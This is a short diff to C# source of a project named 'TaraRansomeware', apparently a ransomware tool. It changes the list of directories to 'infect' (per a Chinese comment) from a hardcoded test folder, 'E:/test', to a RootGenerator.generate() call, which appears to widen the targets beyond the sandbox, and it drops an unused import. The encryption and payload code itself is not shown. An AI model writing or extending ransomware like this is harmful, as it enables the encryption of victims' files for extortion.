@@ -1,6 +1,5 @@
 ﻿using Org.BouncyCastle.Crypto.Digests;
 using Org.BouncyCastle.Utilities.Encoders;
-using System.Diagnostics;
 using System.Threading.Tasks;
 using TaraRansomeware.Engines;
 using TaraRansomeware.Utilities;
@@ -17,7 +16,7 @@ namespace TaraRansomeware
         /// <summary>
         /// 需要进行感染的目录根
         /// </summary>
-        private static string[] rootdir = { "E:/test" };
+        private static string[] rootdir = RootGenerator.generate();
 
         /// <summary>
         /// 文件处理器
